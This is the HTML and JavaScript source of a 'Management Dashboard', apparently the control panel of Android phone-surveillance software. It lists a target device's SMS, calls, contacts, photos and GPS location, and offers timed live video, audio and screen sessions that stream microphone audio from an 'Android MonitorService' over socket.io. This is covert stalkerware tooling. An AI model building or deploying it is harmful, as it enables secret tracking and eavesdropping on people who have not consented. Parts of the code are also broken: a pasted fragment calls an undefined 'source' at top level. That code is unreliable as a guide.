<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Management Dashboard</title>
    <script src="/socket.io/socket.io.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <style>
        :root { --side-bg: #34495e; --side-active: #40c4ff; --bg-main: #f4f7f6; --red-accent: #e74c3c; }
        body { font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; height: 100vh; background: var(--bg-main); overflow: hidden; }

        /* Sidebar Styling (Screenshot 195448) */
        .sidebar { width: 260px; background: var(--side-bg); color: white; display: flex; flex-direction: column; overflow-y: auto; }
        .nav-item { padding: 12px 20px; display: flex; align-items: center; color: #bdc3c7; cursor: pointer; border-bottom: 1px solid #2c3e50; font-size: 0.95rem; position: relative; }
        .nav-item i:first-child { width: 25px; margin-right: 15px; text-align: center; }
        .nav-item .fa-chevron-left { margin-left: auto; font-size: 0.7rem; opacity: 0.5; }
        .nav-item:hover { background: #2c3e50; color: white; }
        .nav-item.active { background: var(--side-active); color: white; }
        .nav-item.active::after { content: ''; position: absolute; right: 0; top: 50%; transform: translateY(-50%); border-top: 10px solid transparent; border-bottom: 10px solid transparent; border-right: 10px solid var(--bg-main); }

        /* Content Area */
        .main { flex: 1; display: flex; flex-direction: column; }
        .header-title { padding: 15px 25px; background: white; border-bottom: 1px solid #ddd; color: var(--side-active); font-weight: bold; display: flex; align-items: center; gap: 10px; text-transform: uppercase; font-size: 0.85rem; }
        .content { flex: 1; padding: 20px; overflow-y: auto; }

        /* Live Viewing UI (Screenshots 194610/17/25) */
        .live-tabs { display: flex; gap: 2px; border-bottom: 2px solid var(--red-accent); margin-bottom: 15px; }
        .tab { padding: 8px 15px; cursor: pointer; font-size: 0.85rem; display: flex; align-items: center; gap: 5px; background: #eee; border-radius: 4px 4px 0 0; }
        .tab.active { background: var(--red-accent); color: white; }
        .session-box { border: 1px solid var(--side-active); padding: 15px; background: white; font-size: 0.85rem; line-height: 1.8; margin-bottom: 20px; }
        .mode-grid { display: flex; justify-content: center; gap: 10px; margin: 30px 0; }
        .mode-card { width: 90px; height: 100px; border: 1px solid #ddd; background: white; display: flex; flex-direction: column; align-items: center; justify-content: center; cursor: pointer; position: relative; }
        .mode-card i { font-size: 2rem; margin-bottom: 10px; }
        .mode-card.selected .check-mark { display: block; }
        .check-mark { position: absolute; top: 5px; color: var(--side-active); display: none; }
        .btn-start { background: #337ab7; color: white; border: none; padding: 8px 30px; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 20px; }

        /* SMS Table (Screenshot 194337) */
        .data-table { width: 100%; border-collapse: collapse; background: white; border: 1px solid #ddd; }
        .data-table th { padding: 12px; text-align: left; border-bottom: 2px solid #eee; font-size: 0.9rem; color: #333; cursor: pointer; }
        .data-table td { padding: 10px; border-bottom: 1px solid #eee; font-size: 0.85rem; color: #555; }
        .data-table th i { font-size: 0.7rem; color: #ccc; margin-left: 5px; }

        /* Location Modal (Screenshot 195013) */
        .modal { display: none; position: fixed; z-index: 2000; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); }
        .modal-content { background: white; width: 80%; max-width: 900px; margin: 50px auto; border-radius: 4px; overflow: hidden; }
        .modal-header { padding: 10px 15px; background: #fff; font-size: 0.9rem; color: #333; position: relative; }
        #map { height: 400px; width: 100%; }
        .modal-footer { padding: 10px; text-align: right; background: #f9f9f9; }
    </style>
</head>
<body>

    <div class="sidebar">
        <div class="nav-item active" onclick="showPage('dashboard')"><i class="fa fa-home"></i> Dashboard</div>
        <div class="nav-item" onclick="showPage('sms')"><i class="fa fa-envelope"></i> SMS <i class="fa fa-chevron-left"></i></div>
        <div class="nav-item"><i class="fa fa-image"></i> MMS</div>
        <div class="nav-item" onclick="showPage('calls')"><i class="fa fa-phone"></i> Calls <i class="fa fa-chevron-left"></i></div>
        <div class="nav-item" onclick="showPage('locations')"><i class="fa fa-map"></i> Locations <i class="fa fa-chevron-left"></i></div>
        <div class="nav-item"><i class="fa fa-images"></i> Pictures</div>
        <div class="nav-item"><i class="fa fa-gamepad"></i> Apps</div>
        <div class="nav-item"><i class="fa fa-calendar-days"></i> Calendar</div>
        <div class="nav-item"><i class="fa fa-book"></i> Contacts</div>
        <div class="nav-item" onclick="showPage('live')"><i class="fa fa-video"></i> Live viewing</div>
    </div>

    <div class="main">
        <div class="header-title" id="page-title"><i class="fa fa-video"></i> LIVE VIEWING</div>
        
        <div class="content">
            <div id="page-live">
                <div class="live-tabs">
                    <div class="tab active"><i class="fa fa-video" style="color:#red"></i> Live</div>
                    <div class="tab"><i class="fa fa-file-video"></i> Record</div>
                </div>
                <div class="session-box">
                    You have <b>31</b> sessions out of the 40 daily.<br>
                    The sessions will be reset in: <b>11 hours, 2 minutes, 5 seconds</b><br>
                    A session lasts 1 minute.
                    <p style="text-align:center; font-size:0.75rem; color:#888;">You have 28 sessions available in addition to the daily sessions.</p>
                </div>
                <div class="mode-grid">
                    <div class="mode-card" onclick="setMode('video')"><i class="fa fa-circle-check check-mark"></i><i class="fa fa-video" style="color:#e67e22"></i><span style="font-size:0.6rem; color:#e67e22; font-weight:bold">VIDEO</span></div>
                    <div class="mode-card" onclick="setMode('audio')"><i class="fa fa-circle-check check-mark"></i><i class="fa fa-file-audio" style="color:#9b59b6"></i><span style="font-size:0.6rem; color:#9b59b6; font-weight:bold">AUDIO</span></div>
                    <div class="mode-card selected" onclick="setMode('screen')"><i class="fa fa-circle-check check-mark"></i><i class="fa fa-desktop" style="color:#e74c3c"></i><span style="font-size:0.6rem; color:#e74c3c; font-weight:bold">SCREEN</span></div>
                </div>
                <div style="text-align:center">
                    <select style="width:250px; padding:5px; margin-bottom:10px;"><option>No sound</option></select><br>
                    <select style="width:250px; padding:5px; margin-bottom:10px;"><option>1 minute (1 session)</option></select><br>
                    <label style="font-size:0.8rem">Record <span style="background:#e74c3c; color:white; padding:1px 5px; font-weight:bold">OFF</span></label><br>
                    <button class="btn-start"><i class="fa fa-play"></i> START</button>
                </div>
            </div>

            <div id="page-sms" style="display:none">
                <select style="margin-bottom:10px;"><option>10</option></select>
                <table class="data-table">
                    <thead>
                        <tr><th><input type="checkbox"></th><th>Type <i class="fa fa-sort"></i></th><th>Name <i class="fa fa-sort"></i></th><th>Message <i class="fa fa-sort"></i></th><th>Number <i class="fa fa-sort"></i></th><th>Date <i class="fa fa-sort-down"></i></th></tr>
                    </thead>
                    <tbody id="sms-body"></tbody>
                </table>
            </div>
        </div>
    </div>

    <div id="locModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <b id="loc-addr">8F9G+8J5, Dastagirnagar, Hyderabad, India</b><br>
                <small>Accuracy: 13.99 m | 2026/01/15 19:41:54</small>
                <span style="position:absolute; right:10px; top:5px; cursor:pointer" onclick="closeLoc()">Ã—</span>
            </div>
            <div id="map"></div>
            <div class="modal-footer">
                <button onclick="closeLoc()" style="background:#337ab7; color:white; border:none; padding:5px 15px; cursor:pointer">CLOSE</button>
            </div>
        </div>
    </div>

    <script>
        const socket = io();
        let map;

        function showPage(p) {
            document.querySelectorAll('[id^="page-"]').forEach(el => el.style.display = 'none');
            document.getElementById('page-' + p).style.display = 'block';
            document.getElementById('page-title').innerHTML = `<i class="fa fa-${p==='sms'?'envelope':(p==='live'?'video':'map')}"></i> ${p.toUpperCase()}`;
            if(p === 'locations') openLoc();
        }

        function openLoc() {
            document.getElementById('locModal').style.display = 'block';
            if (!map) {
                map = L.map('map').setView([17.3850, 78.4867], 15);
                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
                L.marker([17.3616, 78.4747]).addTo(map).bindPopup("Current Device Location").openPopup();
            }
        }

        function closeLoc() { document.getElementById('locModal').style.display = 'none'; }
        function setMode(m) {
            document.querySelectorAll('.mode-card').forEach(c => c.classList.remove('selected'));
            event.currentTarget.classList.add('selected');
        }
        // --- AUDIO PLAYBACK CONFIGURATION ---
const audioCtx = new (window.AudioContext || window.webkitAudioContext)({ sampleRate: 44100 });
let nextStartTime = 0;

/**
 * Converts Base64 PCM data to an AudioBuffer and schedules it for playback.
 * This handles the "audio-stream" event from the Android MonitorService.
 */
function playPcmData(base64Data) {
    // Decode Base64 to a byte array
    const binaryString = window.atob(base64Data);
    const len = binaryString.length;
    const bytes = new Int16Array(len / 2);

    for (let i = 0; i < len; i += 2) {
        // Convert two bytes into one 16-bit little-endian integer
        bytes[i / 2] = (binaryString.charCodeAt(i + 1) << 8) | binaryString.charCodeAt(i);
    }

    // Convert Int16 PCM to Float32 for Web Audio API
    const float32Data = new Float32Array(bytes.length);
    for (let i = 0; i < bytes.length; i++) {
        float32Data[i] = bytes[i] / 32768.0;
    }

    // Create a buffer and schedule it
    const buffer = audioCtx.createBuffer(1, float32Data.length, 44100);
    buffer.getChannelData(0).set(float32Data);

    const source = audioCtx.createBufferSource();
    source.buffer = buffer;
    source.connect(audioCtx.destination);

    // Timing logic to prevent gaps/stuttering
    const currentTime = audioCtx.currentTime;
    if (nextStartTime < currentTime) {
        nextStartTime = currentTime;
    }
    source.start(nextStartTime);
    nextStartTime += buffer.duration;
}

// --- NEW SOCKET LISTENER ---
// Ensure this is inside your socket connection block
socket.on('audio-stream', (data) => {
    // Browsers block audio until a user clicks something. 
    // Ensure you click "Connect" or "Start Stream" first to resume audioCtx.
    if (audioCtx.state === 'suspended') {
        audioCtx.resume();
    }
    playPcmData(data); //
});
const analyser = audioCtx.createAnalyser();
analyser.fftSize = 256;
const bufferLength = analyser.frequencyBinCount;
const dataArray = new Uint8Array(bufferLength);

// Inside playPcmData, before source.start():
source.connect(analyser);
analyser.connect(audioCtx.destination);

function drawVisualizer() {
    requestAnimationFrame(drawVisualizer);
    analyser.getByteFrequencyData(dataArray);
    // Use dataArray to draw bars on a <canvas> element
}
// --- UPDATED COMMAND BUTTONS ---
// Add these to your command sending function
function startAudio() {
    socket.emit('command', 'start-audio'); // Triggers startAudioCapture() in Android
}

function stopAudio() {
    socket.emit('command', 'stop-audio'); // Triggers stopAudioCapture() in Android
}
    </script>
</body>
</html>


